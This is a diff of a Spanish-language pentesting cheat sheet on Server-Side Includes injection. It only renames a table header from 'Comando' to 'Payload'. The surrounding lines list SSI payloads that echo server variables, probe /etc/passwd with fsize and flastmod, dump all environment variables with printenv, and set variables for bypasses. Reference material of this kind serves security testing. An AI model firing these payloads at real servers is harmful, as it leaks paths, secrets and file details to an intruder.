@@ -21,7 +21,7 @@ linked:
 
 ## `#echo` Environment Variables
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |---|---|---|
 | `<!--#echo var="DATE_LOCAL" -->` | Fecha del server | PoC / confirmar SSI activo |
 | `<!--#echo var="DOCUMENT_ROOT" -->` | Webroot absoluto | Base para LFI/traversal |
@@ -40,7 +40,7 @@ linked:
 
 ## `#fsize` y `#flastmod` (Filesystem Enum)
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |---|---|---|
 | `<!--#fsize file="/etc/passwd" -->` | Tamaño del archivo en bytes | Confirmar existencia + lectura |
 | `<!--#flastmod file="/etc/passwd" -->` | Última modificación (timestamp) | Pista de actividad |
@@ -69,7 +69,7 @@ linked:
 
 ## `#printenv`, `#set` y `#config`
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |---|---|---|
 | `<!--#printenv -->` | Dump de TODAS las env vars | Recon completo de una |
 | `<!--#set var="x" value="hello" -->` | Define una var local | Base para concat/bypass |
